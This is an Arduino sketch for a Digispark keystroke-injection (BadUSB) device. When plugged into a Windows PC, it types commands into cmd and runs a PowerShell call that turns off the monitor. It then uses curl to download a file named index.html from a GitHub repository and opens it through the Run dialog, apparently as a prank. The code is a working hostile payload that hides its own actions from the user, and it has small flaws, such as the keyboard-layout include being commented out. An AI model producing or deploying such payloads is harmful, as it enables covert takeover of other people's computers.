#include "DigiKeyboard.h"
//#include "DigiKeyboardDe.h" //for De Layout

void setup() {
  //DigiMouse.begin();
}
void loop() {
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(200);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.delay(80);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(600);
  DigiKeyboardDe.print("powershell (Add-Type '[DllImport(\\");
  DigiKeyboardDe.print("\"user32.dll\\");
  DigiKeyboardDe.print("\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)");
  DigiKeyboardDe.delay(80);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.print("curl https://raw.githubusercontent.com/Isht4r/darling_roll/5859d22e3f484cb14cb9b9a3465bb0d1a042c569/index.html -O index.html");
  DigiKeyboardDe.delay(80);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(2200);
  DigiKeyboardDe.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboardDe.delay(2200);
  
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(80);
  
  DigiKeyboardDe.print("index.html");
  DigiKeyboardDe.delay(200);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  
  for(;;){ /*empty*/ }
}
